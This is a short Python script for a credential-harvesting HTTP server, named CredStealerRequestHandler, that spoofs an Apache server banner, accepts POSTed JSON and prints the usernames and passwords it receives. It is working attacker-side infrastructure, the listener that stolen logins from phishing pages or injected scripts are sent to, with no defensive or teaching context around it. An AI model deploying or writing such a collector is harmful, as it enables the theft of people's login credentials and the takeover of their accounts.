#!/usr/bin/python3

import http.server
import http
import json
import urllib.parse
import argparse

class CredStealerRequestHandler(http.server.BaseHTTPRequestHandler):
    server_version = "Apache/2.4.9 (Linux)"
    def do_POST(self):
        data_string = self.rfile.read(int(self.headers["Content-Length"]))
        self.send_response(http.HTTPStatus.OK)
        self.end_headers()
        print(data_string)
        data = json.loads(urllib.parse.unquote(data_string.decode('utf8')))
        print("Username: {username}\nPassword: {password}\n\n".format(**data))

parser = argparse.ArgumentParser()
parser.add_argument('port', action='store',
                    default=8000, type=int,
                    nargs='?',
                    help='Specify alternate port [default: 8000]')
args = parser.parse_args()

server_addr = ('', args.port)
server = http.server.HTTPServer(server_addr, CredStealerRequestHandler)
server.serve_forever()
